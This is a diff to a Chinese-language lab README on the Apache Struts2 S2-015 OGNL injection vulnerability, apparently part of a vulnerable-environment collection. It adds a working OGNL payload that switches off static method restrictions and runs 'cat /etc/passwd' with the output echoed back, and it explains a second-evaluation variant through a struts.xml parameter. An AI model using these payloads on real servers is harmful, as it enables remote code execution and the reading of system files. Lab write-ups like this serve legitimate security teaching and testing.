@@ -35,5 +35,27 @@ docker-compose up -d
 #context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true)
 ```
 
-可以构造 Payload 如下：`http://your-ip:8080/S2-015/${%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23f=%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),@java.lang.Runtime@getRuntime().exec('calc')}.action`
+可以构造 Payload 如下：
 
+```
+${#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('cat \u002fetc\u002fpasswd').getInputStream()),#q}
+```
+
+直接回显：
+
+![](01.png)
+
+除了上面所说到的这种情况以外，S2-015 还涉及一种二次引用执行的情况：
+
+```xml
+<action name="param" class="com.demo.action.ParamAction">
+    <result name="success" type="httpheader">
+        <param name="error">305</param>
+        <param name="headers.fxxk">${message}</param>
+    </result>
+</action>
+```
+
+这里配置了 `<param name="errorMessage">${message}</param>`，其中 message 为 ParamAction 中的一个私有变量，这样配置会导致触发该 Result 时，Struts2 会从请求参数中获取 message 的值，并在解析过程中，触发了 OGNL 表达式执行，因此只用提交 %{1111*2} 作为其变量值提交就会得到执行。这里需要注意的是这里的二次解析是因为在 struts.xml 中使用 ${param} 引用了 Action 中的变量所导致的，并不针对于 type="httpheader" 这种返回方式。
+
+![](02.png)
